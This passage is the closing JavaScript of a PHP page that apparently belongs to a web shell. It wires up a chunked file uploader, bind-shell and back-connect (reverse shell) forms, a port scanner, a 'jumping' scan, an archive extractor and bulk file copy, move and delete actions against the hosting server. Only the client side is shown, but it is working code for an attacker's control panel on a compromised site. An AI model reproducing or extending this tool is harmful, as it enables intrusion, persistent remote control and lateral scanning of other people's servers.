const progressBar=progressItem.querySelector('.upload-progress-bar');
const statusEl=progressItem.querySelector('.status');
const percentageEl=progressItem.querySelector('.percentage');
function uploadNextChunk(){
if(chunkIndex>=totalChunks){
statusEl.textContent='✅ Completed';
statusEl.style.color='#0f0';
resolve();
return;
}
const start=chunkIndex*chunkSize;
const end=Math.min(start+chunkSize,file.size);
const chunk=file.slice(start,end);
const formData=new FormData();
formData.append('ajax_action','upload_file_chunk');
formData.append('chunk',chunk,file.name);
formData.append('upload_target_path',currentFileManagerPath);
formData.append('upload_id',uploadId);
formData.append('chunk_index',chunkIndex);
formData.append('total_chunks',totalChunks);
formData.append('original_filename',file.name);
const xhr=new XMLHttpRequest();
xhr.open('POST','<?php echo $_SERVER['PHP_SELF']; ?>',true);
xhr.upload.onprogress=(e)=>{
if(e.lengthComputable){
const totalProgress=((chunkIndex+(e.loaded/e.total))/totalChunks)*100;
progressBar.style.width=totalProgress.toFixed(2)+'%';
percentageEl.textContent=totalProgress.toFixed(1)+'%';
statusEl.textContent=`Uploading chunk ${chunkIndex+1}/${totalChunks}...`;
}
};
xhr.onload=()=>{
if(xhr.status>=200&&xhr.status<300){
try{
const response=JSON.parse(xhr.responseText);
if(response.status==='chunk_ok'||response.status==='success'){
chunkIndex++;
uploadNextChunk();
}else{
throw new Error(response.message||'Unknown server error during upload.');
}
}catch(e){
statusEl.textContent='❌ Error: '+e.message;
statusEl.style.color='#f00';
reject(e);
}
}else{
statusEl.textContent=`❌ HTTP Error: ${xhr.statusText}`;
statusEl.style.color='#f00';
reject(new Error(`HTTP Error: ${xhr.statusText}`));
}
};
xhr.onerror=()=>{
statusEl.textContent='❌ Network Error';
statusEl.style.color='#f00';
reject(new Error('Network Error during upload.'));
};
xhr.send(formData);
}
uploadNextChunk();
});
}
const networkResultsArea=document.getElementById('network-results-area');
async function sendNetworkRequest(formId,sub_action,data,isForeground=false){
networkResultsArea.innerHTML=`Executing${isForeground?' (page may hang)':''}... <i class="fas fa-spinner fa-spin"></i>`;
data.sub_action=sub_action;
const result=await sendAjaxRequest('network_tool',data);
const output=result.output||result.message||'[Error] Unknown network response.';
networkResultsArea.innerHTML=sub_action==='port_scan'?output:htmlEntities(output).replace(/\n/g,'<br>');
}
document.getElementById('php-bind-form').addEventListener('submit',(e)=>{
e.preventDefault();const data={port:e.target.elements['port'].value,bind_pass:e.target.elements['bind_pass'].value};
sendNetworkRequest(e.target.id,'php_bind',data,true);
});
document.getElementById('php-back-connect-form').addEventListener('submit',(e)=>{
e.preventDefault();const data={ip:e.target.elements['ip'].value,backport:e.target.elements['backport'].value};
sendNetworkRequest(e.target.id,'php_back_connect',data,true);
});
document.getElementById('ping-form').addEventListener('submit',(e)=>{
e.preventDefault();sendNetworkRequest(e.target.id,'ping',{host:e.target.elements['ping_host'].value});
});
document.getElementById('dns-form').addEventListener('submit',(e)=>{
e.preventDefault();sendNetworkRequest(e.target.id,'dns',{host:e.target.elements['dns_host'].value});
});
document.getElementById('port-scan-form').addEventListener('submit',(e)=>{
e.preventDefault();const data={host:e.target.elements['scan_host'].value,scan_ports:e.target.elements['scan_ports'].value};
sendNetworkRequest(e.target.id,'port_scan',data);
});
startJumpingScanBtn.addEventListener('click',async()=>{
jumpingResultsDiv.innerHTML='Scanning... <i class="fas fa-spinner fa-spin"></i>';
startJumpingScanBtn.disabled=true;
const result=await sendAjaxRequest('jumping_scan');
if(result.status==='success'){
jumpingResultsDiv.innerHTML=result.output;
}else{
jumpingResultsDiv.innerHTML=`<span class="jumping-error">${htmlEntities(result.message||'An unknown error occurred.')}</span>`;
}
startJumpingScanBtn.disabled=false;
});
uncompressorSubTabs.forEach(tab=>{
tab.addEventListener('click',()=>{
uncompressorSubTabs.forEach(t=>t.classList.remove('active'));
uncompressorSubContents.forEach(c=>c.classList.remove('active'));
tab.classList.add('active');
document.getElementById(tab.dataset.subtab).classList.add('active');
if(tab.dataset.subtab==='uncompressor-upload'){
uncompressorLocalPathInput.value='';
}else{
uncompressorFileInput.value='';
}
});
});
uncompressorForm.addEventListener('submit',async(e)=>{
e.preventDefault();
uncompressorResults.innerHTML='Processing... <i class="fas fa-spinner fa-spin"></i>';
const formData=new FormData(uncompressorForm);
formData.append('ajax_action','uncompress_file');
const result=await sendAjaxRequest('uncompress_file',formData,true);
if(result.status==='html_error'||(typeof result.status==='undefined'&&result.content)){
uncompressorResults.innerHTML=`<div class="error">A server-side error occurred. The server sent back an invalid response (non-JSON). Check server error logs.</div>`;
console.error("Uncompressor HTML Error:",result.content||'Response was not valid JSON.');
return;
}
const message=result.message?htmlEntities(result.message).replace(/\n/g,'<br>'):'Operation finished with no message.';
const resultClass=result.status==='success'?'success':'error';
uncompressorResults.innerHTML=`<div class="${resultClass}">${message}</div>`;
if(result.status==='success'&&document.getElementById('filemanager').classList.contains('active')){
const dest=document.getElementById('uncompressor-destination').value.trim();
if(dest==='.'||dest===''){
fetchFiles(currentFileManagerPath);
}
}
});
function updateBulkActionsVisibility(){
const checkedBoxes=document.querySelectorAll('.file-checkbox:checked');
if(checkedBoxes.length>0){
bulkActionsContainer.classList.remove('hidden');
}else{
bulkActionsContainer.classList.add('hidden');
selectAllCheckbox.checked=false;
}
}
selectAllCheckbox.addEventListener('change',function(){
const checkboxes=document.querySelectorAll('.file-checkbox');
checkboxes.forEach(checkbox=>{
checkbox.checked=this.checked;
});
updateBulkActionsVisibility();
});
bulkActionSelect.addEventListener('change',function(){
const selectedAction=this.value;
bulkDestinationPath.classList.add('hidden');
bulkArchiveName.classList.add('hidden');
if(selectedAction==='copy'||selectedAction==='move'){
bulkDestinationPath.classList.remove('hidden');
bulkDestinationPath.placeholder='Destination Path';
bulkDestinationPath.value=currentFileManagerPath;
}else if(selectedAction==='zip'||selectedAction==='tar.gz'||selectedAction==='tar.bz2'){
bulkArchiveName.classList.remove('hidden');
let ext=selectedAction;
bulkArchiveName.placeholder=`archive.${ext}`;
bulkArchiveName.value=`archive.${ext}`;
}
});
bulkActionGoBtn.addEventListener('click',async function(){
const operation=bulkActionSelect.value;
const selectedItems=Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb=>cb.dataset.path);
if(!operation){
showCustomAlert('Please select a bulk action.','error');
return;
}
if(selectedItems.length===0){
showCustomAlert('Please select at least one item.','error');
return;
}
let data={bulk_operation:operation,selected_items:JSON.stringify(selectedItems)};
if(operation==='copy'||operation==='move'){
const destPath=bulkDestinationPath.value.trim();
if(!destPath){
showCustomAlert('Destination path cannot be empty.','error');
return;
}
data.destination_path=destPath;
}else if(operation.startsWith('zip')||operation.startsWith('tar')){
const archiveName=bulkArchiveName.value.trim();
if(!archiveName){
showCustomAlert('Archive filename cannot be empty.','error');
return;
}
data.archive_filename=archiveName;
}
if(operation==='delete'){
if(!confirm(`Are you sure you want to delete ${selectedItems.length} selected item(s)? This cannot be undone.`)){
return;
}
}
this.disabled=true;
const result=await sendAjaxRequest('bulk_action',data);
this.disabled=false;
showCustomAlert(result.message,result.status);
if(result.status==='success'){
fetchFiles(currentFileManagerPath);
}
});
if(document.getElementById('filemanager').classList.contains('active')){
fetchFiles(currentFileManagerPath);
}
});
</script>
</body>
</html>